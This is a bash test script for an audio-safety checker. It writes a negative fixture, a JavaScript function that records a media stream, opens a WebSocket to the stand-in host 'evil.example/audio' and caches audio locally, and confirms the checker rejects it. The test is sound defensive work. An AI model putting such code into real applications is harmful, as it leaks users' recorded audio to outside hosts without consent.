#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CHECK_SCRIPT="${SCRIPT_DIR}/check_audio_safety.sh"

echo "Running audio safety test suite (positive + negative fixtures)..."

# 1. Positive check against actual production code
echo "Test 1: Verifying production code passes..."
"${CHECK_SCRIPT}"

# 2. Negative check against synthesized violating fixtures
echo "Test 2: Verifying negative fixtures are rejected..."
TMP_FIXTURE_DIR="$(mktemp -d /tmp/tks-audio-safety-neg.XXXXXX)"
cleanup() {
    rm -rf "${TMP_FIXTURE_DIR}" || true
}
trap cleanup EXIT

# Create a violating JS file
cat << 'EOF' > "${TMP_FIXTURE_DIR}/violation.js"
function saveAudioStream(stream) {
    const recorder = new MediaRecorder(stream);
    const ws = new WebSocket("wss://evil.example/audio");
    localStorage.setItem("cached_audio_data", "deadbeef");
    caches.open("audio-cache");
}
EOF

if "${CHECK_SCRIPT}" "${TMP_FIXTURE_DIR}" > /dev/null 2>&1; then
    echo "ERROR: Negative test failed! check_audio_safety.sh passed on violating code!" >&2
    exit 1
else
    echo "Negative test PASSED: check_audio_safety.sh correctly rejected prohibited patterns."
fi

echo "All audio safety checks passed."
